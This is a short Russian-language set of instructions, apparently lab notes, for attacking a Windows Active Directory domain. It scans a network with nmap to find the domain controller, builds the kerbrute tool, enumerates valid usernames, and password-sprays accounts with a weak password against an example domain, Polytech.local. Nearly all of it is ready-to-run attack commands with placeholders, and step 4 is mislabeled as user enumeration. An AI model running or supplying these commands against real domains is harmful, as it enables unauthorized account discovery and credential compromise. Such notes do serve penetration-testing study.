1. Сканируем сеть, узнаём ip-адрес контроллера домена и имя домена. <br>
   sudo nmap --script whois-domain.nse 192.168.0.0/16
2. Скачиваем kerbrute репозиторий, преобразуем исходный код в модули <br>
   Git clone git@github.com:ropnop/kerbrute.git<br>
   make all
3. Производим атаку «Перебор пользователей».<br>
   ./kerbrute_linux_amd64 userenum -d \$Domain_fqdn \$users_list --output \$filename <br>, где
   $Domain_fqdn – имя домена, \$users_list – файл со списком пользователей, $filename – вывод файла.<br>
   Пример: /kerbrute_linux_amd64 userenum -d Polytech.local candidate_users.txt --output users.txt
4. Производим атаку Перебор пользователей.<br>
   ./kerbrute_linux_amd64 passwordspray -d \$Domain_FQDN \$users_list \$Password <br>
   Пример: ./kerbrute_linux_amd64 passwordspray –dc 192.168.1.200 -d Polytech.local users.txt Qwerty12
